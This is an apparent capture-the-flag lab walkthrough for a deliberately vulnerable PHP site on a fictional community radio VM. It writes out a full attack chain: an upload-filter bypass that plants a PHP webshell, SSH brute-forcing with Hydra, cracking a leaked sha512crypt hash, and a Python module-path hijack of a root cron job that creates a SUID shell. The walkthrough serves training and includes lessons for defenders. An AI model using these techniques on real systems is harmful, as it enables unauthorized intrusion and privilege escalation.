# Fernwood Community Radio — Lab Walkthrough

**Theme:** Fernwood Community Radio is a fictional volunteer-run internet
radio station running a small self-hosted PHP site so DJs can browse the
weekly show schedule and upload cover art for their shows. The cover-art
uploader was built by a volunteer for launch week and never hardened — it
checks the uploaded filename against a short, case-sensitive extension
blacklist and nothing else. A second, unrelated leftover (a retired
Basic-Auth credential file from an old archive-room login page) and a
third, unrelated automation job (a root cron script with a hijackable
Python module path) complete the chain to root.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_fernwoodradio.sh` target running on your own isolated lab VM only.
Do not run these techniques against systems you do not own or lack
explicit authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found in `djcrew`'s home directory after logging in
  with a credential leaked via an upload-filter bypass.
- `INTERMEDIATE_FLAG.txt` — found after cracking a leaked password hash
  and pivoting to `archivist`.
- `HARD_FLAG.txt` — found after privilege escalation to root via a
  Python module search-path hijack in a group-writable cron dependency.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated,
   host-only or NAT'd network (no bridged/public NIC).
2. Copy `setup_fernwoodradio.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_fernwoodradio.sh
   sudo ./setup_fernwoodradio.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean
   restore point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity
   to the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output for later reference.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

Note what's absent: `3306/tcp` (MariaDB) never appears — it's bound to
`127.0.0.1` only on this target, so it won't respond to a remote scan.

For directory discovery on this box, use `gobuster` — Kali's standard
directory list is enough here, since the interesting pages are also
linked from the homepage:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php -t 40
```

- `-u http://<target-ip>/` — target URL to scan.
- `-w /usr/share/wordlists/dirb/common.txt` — a generic, widely-reused
  filename/directory list.
- `-x php` — also try each wordlist entry with `.php` appended.
- `-t 40` — 40 concurrent threads.

This turns up:
```
/index.php            (Status: 200)
/schedule.php         (Status: 200)
/upload.php           (Status: 200)
/uploads/             (Status: 301)
```

Check the homepage source and the schedule page too, for context before
touching anything:

```bash
curl -s http://<target-ip>/ | grep -i href
curl http://<target-ip>/schedule.php
```

```
<li><a href="schedule.php">This week's schedule</a></li>
<li><a href="upload.php">DJ cover-art upload</a></li>
```
```
<h2>Weekly Schedule</h2><ul>
<li>Mon 07:00 — Sunrise Static (DJ djcrew)</li>
<li>Wed 20:00 — Vinyl Hour (DJ dj_marcus)</li>
<li>Fri 22:00 — Archive Replay (DJ archivist)</li>
</ul>
```

The DJ usernames listed here (`djcrew`, `dj_marcus`, `archivist`) matter
later, for correlating shell accounts. There's no flag reachable from
pure enumeration on this box — both the upload-filter bypass and a
foothold are needed before any flag is reachable.

---

## Part 2 – Identify Vulnerabilities

Three separate weaknesses need to be chained here before you reach root.

### 2a. Case-sensitive extension blacklist on the cover-art uploader
     (initial access)

`upload.php` rejects a short, hardcoded list of extensions
(`php`, `php3`, `php4`, `php5`) using an exact, case-sensitive string
match — and never inspects the file's actual content or MIME type. That
means any extension outside that literal list, including a
differently-cased `.PHP` or an alternate PHP-executable extension like
`.phtml`, sails straight through, and Apache's default handler still
executes it as PHP.

### 2b. Crackable password hash in a leftover legacy auth file
     (lateral movement, exploited in Part 4)

Not visible yet — this is discovered *after* you have a shell as
`djcrew`, in Part 4.

### 2c. Group-writable Python module directory imported by a root cron job
     (privilege escalation, confirmed in Part 5)

Also not visible yet — discovered after landing on `archivist`.

---

## Part 3 – Gain Access

This box is worked through **Burp Suite** from here on — Proxy to
capture the upload, Intruder to fuzz the filter, Repeater to weaponize
it.

**Step 1 — Install and launch Burp Suite:**

```bash
which burpsuite || which burpsuite-community || true
sudo apt-get update
sudo apt-get install -y burpsuite
burpsuite
```

**Step 2 — Choose the project and settings:**

1. On the welcome screen, select the radio button **Temporary project in
   memory**, then click the **Next** button (bottom right).
2. On the next screen, select **Use Burp defaults**, then click the
   orange **Start Burp** button (bottom right).

**Step 3 — Turn on Intercept and open the proxy browser:**

1. Click the **Proxy** tab in the top menu bar.
2. Click the **Intercept** sub-tab (it's selected by default).
3. Click the **Intercept is off** button so it toggles to
   **Intercept is on** (the button turns blue/highlighted).
4. Still on the Intercept screen, click the **Open browser** button.
   This launches Burp's embedded Chromium browser, already configured
   to route through the proxy at `127.0.0.1:8080` — no manual FoxyProxy
   setup needed.

**Step 4 — Capture a baseline upload request:**

1. In the Burp browser window, navigate to
   `http://<target-ip>/upload.php`.

   > **If the page just spins and never loads:** this is expected —
   > Intercept is on, so Burp has paused your request and is waiting
   > for you to deal with it before it goes anywhere. Switch back to
   > the main Burp Suite window; you should see the paused `GET
   > /upload.php` request sitting on the **Proxy → Intercept** tab.
   > Click the **Forward** button (next to the Intercept toggle) once
   > to let that single request through. The browser tab will then
   > finish loading and show the upload form.
   >
   > If nothing shows up on the Intercept tab at all (the browser just
   > hangs with no paused request visible), check these instead:
   > - Confirm you're using **Burp's embedded browser** (the one opened
   >   via the **Open browser** button), not your normal Firefox —
   >   only the embedded browser is pre-configured to route through
   >   the proxy.
   > - Confirm the listener is actually up: run
   >   `netstat -pant | grep 8080` in a terminal — you should see
   >   `127.0.0.1:8080 ... LISTEN`.
   > - Confirm the target itself is reachable outside Burp first:
   >   `curl http://<target-ip>/upload.php` from a normal terminal. If
   >   that also hangs or fails, the problem is network/target
   >   connectivity, not Burp — re-check `ip a` on Kali and `ping
   >   <target-ip>`, and confirm Apache is running on the target
   >   (`systemctl status apache2`).
   > - If you're testing repeatedly, remember every single page
   >   load/asset request (not just the form submission) gets paused
   >   while Intercept is on — you'll need to click **Forward**
   >   repeatedly, or toggle **Intercept is on/off** back to **off**
   >   for normal browsing and only turn it back on right before the
   >   request you actually want to capture (the file upload itself).

2. Choose any small image file in the upload form and click the
   **Upload** button on the page.

   > This submission is the request you actually want to capture, so
   > **make sure Intercept is on** before you click Upload (re-toggle
   > it if you turned it off during the troubleshooting above). Once
   > you click Upload, the page will spin again — this time on
   > purpose. Switch to the main Burp Suite window; the paused `POST
   > /upload.php` request (with the image data in its body) is sitting
   > on **Proxy → Intercept**. This time, **don't click Forward** —
   > you want to send this one to Repeater instead, per the next step.

3. Switch back to the main Burp Suite window — the request is now
   sitting paused on the **Proxy → Intercept** tab.
4. Right-click anywhere in the intercepted request pane and choose
   **Send to Repeater** from the context menu.
5. Click the **Intercept is on** button again to toggle it back to
   **off**, so normal browsing (and later requests) aren't blocked.
6. Click the **Repeater** tab in the top menu bar to switch over and
   view the captured request. The raw multipart body shows a
   `Content-Disposition: form-data; name="coverart"; filename="..."`
   line — this `filename` value is exactly what `upload.php` checks.

**Step 5 — Fuzz the extension blacklist with Intruder:**

1. Back in the **Repeater** tab (or the original entry under
   **Proxy → HTTP history**), right-click the request and choose
   **Send to Intruder**.
2. Click the **Intruder** tab in the top menu bar to switch over.
3. Click the **Positions** sub-tab.
4. Click the **Clear §** button (top right of the request pane) to
   remove all auto-suggested payload markers.
5. In the request body, find the `filename="shell.php"` text, highlight
   just the extension (`php`), and click the **Add §** button so it
   becomes `filename="shell.§php§"`.
6. Confirm the **Attack type** dropdown (top left) is set to **Sniper**.
7. Click the **Payloads** sub-tab.
8. Under **Payload settings**, click into the empty list box and paste
   in, one per line:
   ```
   php
   PHP
   Php
   php3
   php4
   php5
   phtml
   pht
   ```
9. Click the orange **Start attack** button (top right).
10. In the results window that pops up, click the **Length** column
    header to sort by response size — entries with a shorter length
    are the ones the blacklist rejected ("That file type isn't
    allowed"); the longer ones — including `phtml` and `PHP` — got the
    "Uploaded to uploads/..." success message instead, confirming the
    filter gap.

**Step 6 — Weaponize the upload in Repeater:**

1. Close the Intruder results window and click the **Repeater** tab to
   go back to your baseline request.
2. In the request body, edit `filename="shell.php"` to
   `filename="shell.phtml"`.
3. Select the file content further down in the body (the placeholder
   image bytes below the `Content-Type` line for that part) and replace
   it with:
   ```
   <?php system($_GET["cmd"]); ?>
   ```
4. Click the **Send** button (or the ▶ arrow) at the top of the request
   pane.
5. Check the **Response** pane on the right — it should read
   `Uploaded to uploads/shell.phtml`, confirming the payload landed in
   the web root.

**Step 7 — Trigger the webshell and read the leaked config:**

1. Click the **+** tab next to your current Repeater tab to open a new,
   blank Repeater request.
2. Type or paste in the request line and headers:
   ```
   GET /uploads/shell.phtml?cmd=id HTTP/1.1
   Host: <target-ip>
   ```
3. Click **Send**. The **Response** pane should show
   `uid=33(www-data) gid=33(www-data) ...` — code execution confirmed.
4. In the same tab, edit just the `cmd` value in the request line to:
   ```
   GET /uploads/shell.phtml?cmd=cat%20/etc/fernwood/db.conf HTTP/1.1
   Host: <target-ip>
   ```
5. Click **Send** again and check the **Response** pane.

- `%20` — URL-encoded space, since raw spaces aren't valid inside a
  query string.

This returns:

```
; Fernwood Radio site config - do not commit to git (nobody checked)
db_host = localhost
db_user = fernwood_app
db_pass = sunshine1
db_name = fernwood
; shell login for schedule updates uses the same password, ask djcrew
```

A plaintext database password, reused for a real shell account. Before
trying it, you could also validate it against SSH for practice with a
brute-force tool. On Kali, `rockyou.txt` ships gzipped — unzip it first
if you haven't already:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
hydra -l djcrew -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

- `-l djcrew` — the single, known username, taken from the config-file
  comment.
- `-P /usr/share/wordlists/rockyou.txt` — password wordlist to try.
- This will recover `djcrew:sunshine1` quickly since the password is a
  genuine, early-ish entry in `rockyou.txt` — but you already have it
  directly from the leaked config, so this step is optional practice
  rather than a required part of the chain.

SSH in with the leaked credential:

```bash
ssh djcrew@<target-ip>
# password: sunshine1
```

Grab the first flag straight away:

```bash
cat ~/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required the upload-filter
bypass and the config leak, no cracking required.

---

## Part 4 – Lateral Movement / Intermediate Challenge

As `djcrew`, look for anything Fernwood-related outside your home
directory:

```bash
find / -iname "*fernwood*" -readable 2>/dev/null
```

```
/etc/fernwood/db.conf
/var/backups/fernwood/archive_room.htpasswd
/opt/fernwood/modules/stationutils.py
/usr/local/sbin/fernwood_playlist_sync.py
/etc/cron.d/fernwood-playlist-sync
/etc/cron.d/fernwood-heartbeat
/var/log/fernwood
```

`fernwood-heartbeat` is the harmless heartbeat cron — not part of the
intended path. The `.htpasswd` file is the one worth reading.

```bash
cat /var/backups/fernwood/archive_room.htpasswd
```

```
# legacy tape-catalog basic-auth file - retired, .htaccess removed
# TODO: delete, no longer used (never actioned)
archivist:$6$fernwood$...
```

That `$6$...` prefix is a real SHA-512 **crypt hash**, not an encoding —
there's nothing to decode here, it has to be cracked offline. Save just
the credential line to a file on the target:

```bash
echo 'archivist:$6$fernwood$...' > /tmp/archivist.hash
```

`john` lives on your Kali attacker box, not on this Ubuntu target, so
pull the hash file across before cracking it. From a terminal **on
Kali** (not this SSH session into the target):

```bash
scp djcrew@<target-ip>:/tmp/archivist.hash .
# password: sunshine1
```

Still on Kali, in the directory you copied it to, unzip `rockyou.txt` if
you haven't already and run John against it:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt archivist.hash
john --show archivist.hash
```

- John auto-detects the crypt format from the `$6$` prefix (SHA-512
  crypt), so no `--format` flag is needed here.
- `--show` — after a successful crack, print the recovered plaintext
  password without re-running the attack.

If you'd rather cross-check with a different tool for practice, Hashcat
mode `1800` matches `sha512crypt`:

```bash
hashcat -m 1800 -a 0 archivist.hash /usr/share/wordlists/rockyou.txt
```

This recovers `archivist:tigger1`. Switch back to your SSH session on
the target and use it (your session is a real TTY, so `su` works fine
here):

```bash
su archivist
# password: tigger1
```

Grab the intermediate flag from its home directory:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

(The credential also works directly over SSH if you'd rather pivot that
way instead of `su` — either gets you the same shell.)

---

## Part 5 – Privilege Escalation

From your `archivist` shell, check your group memberships:

```bash
id
```

```
uid=1002(archivist) gid=1002(archivist) groups=1002(archivist),1003(fernwood-mods)
```

You're in `fernwood-mods`. The files you found in Part 4 already
pointed at a cron job — look at what it actually does:

```bash
cat /etc/cron.d/fernwood-playlist-sync
cat /usr/local/sbin/fernwood_playlist_sync.py
```

```
* * * * * root /usr/bin/python3 /usr/local/sbin/fernwood_playlist_sync.py
```
```python
#!/usr/bin/env python3
import sys
sys.path.insert(0, '/opt/fernwood/modules')  # THE bug: writable, and first on path
import stationutils

stationutils.log_sync("playlist sync tick")
```

Root runs this every minute, and it imports a helper module from
`/opt/fernwood/modules` — inserted at the **front** of `sys.path` before
the import even happens. Check who can write there:

```bash
ls -ld /opt/fernwood/modules
```

```
drwxrwxr-x 2 root fernwood-mods 4096 ... /opt/fernwood/modules
```

Group-writable by `fernwood-mods` — and this is a completely different
bug from the upload filter in Part 3 or the leaked hash in Part 4. When
Python resolves `import stationutils`, it walks `sys.path` in order and
loads the first matching module it finds; because the writable directory
was inserted ahead of everything else, any file you drop there named
`stationutils.py` wins over the real one — a classic module search-path
hijack (the same family of bug as an insecure `$PATH` for binaries, but
for Python's import system instead). Build the payload:

```bash
cat > /opt/fernwood/modules/stationutils.py <<'EOF'
import os
def log_sync(msg):
    os.system("cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash")
EOF
```

- `stationutils.py` — overwrites the module the cron job imports; the
  real `log_sync()` just wrote to a log file, so replacing it with
  something that spawns a SUID shell hijacks the next cron tick
  completely.

Wait up to a minute for the cron job to fire, then check the result:

```bash
watch -n 2 'ls -l /tmp/rootbash 2>/dev/null'
```

Once `/tmp/rootbash` appears with the `s` bit set (`-rwsr-xr-x`), the
hijack fired:

```bash
/tmp/rootbash -p
id
```

- `-p` — tells `bash` to preserve elevated privileges on startup instead
  of dropping them (a SUID shell normally drops privileges immediately
  unless told not to).

You should see `uid=0(root)`.

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - djcrew's home dir, reached via the upload-filter bypass + config leak (Part 3)
cat /home/djcrew/EASY_FLAG.txt

# Intermediate - archivist's home dir, reached via the cracked legacy hash (Part 4)
cat /home/archivist/INTERMEDIATE_FLAG.txt

# Hard - root's home dir, reached via the Python module-path hijack (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — insecure file upload:** the cover-art uploader
   relies on a short, hardcoded, case-sensitive extension blacklist and
   never inspects file content or MIME type, so renaming a PHP payload
   to `.phtml` (or even just `.PHP`) sails straight through and gives
   code execution as `www-data`. That foothold reveals a plaintext
   database config outside the web root, whose password was reused for
   a real interactive shell account (`djcrew`), bridging the web
   foothold directly to SSH access.
2. **Lateral movement — a real password hash left in a retired
   Basic-Auth file:** an old archive-room login page's `.htpasswd`-style
   credential file was never deleted after the page itself was retired,
   and it stayed world-readable. Unlike an encoded leak, this one is a
   genuine SHA-512 crypt hash, requiring an offline dictionary attack
   (John the Ripper/Hashcat) rather than simple decoding.
3. **Privilege escalation — Python module search-path hijack:** a root
   cron job imported a helper module from a directory that was
   group-writable by an account the attacker had already reached, and
   that directory was inserted at the front of `sys.path` before the
   import. Planting a same-named module there let Python load
   attacker-controlled code as root on the next cron tick — a distinct
   escalation primitive from sudo rules, SUID/PATH-hijack binaries,
   writable cron/systemd *scripts*, tar-wildcard injection, or
   misassigned capabilities used elsewhere in this lab set.

**Root cause lessons for defenders:**
- Validate uploaded file content/MIME type, not just the extension —
  and never trust a blacklist over an allowlist.
- Never reuse the same password across a database service account and
  an interactive shell account.
- Delete retired authentication files along with the feature they
  protected — a `.htpasswd` file with no matching `.htaccess` (or, more
  broadly, any credential file for a page that no longer exists) is a
  pure liability with zero remaining benefit.
- Never insert a group-writable (or otherwise low-privilege-writable)
  directory into a privileged process's module/library search path;
  audit `sys.path`/`$PATH` usage in anything root executes on a
  schedule, the same way you'd audit `sudo` rules or SUID bits.
- Treat any directory writable by a non-root group as untrusted input
  to whatever privileged process later reads from it.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk
   entirely rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `sunshine1` or `tigger1` anywhere
   real).
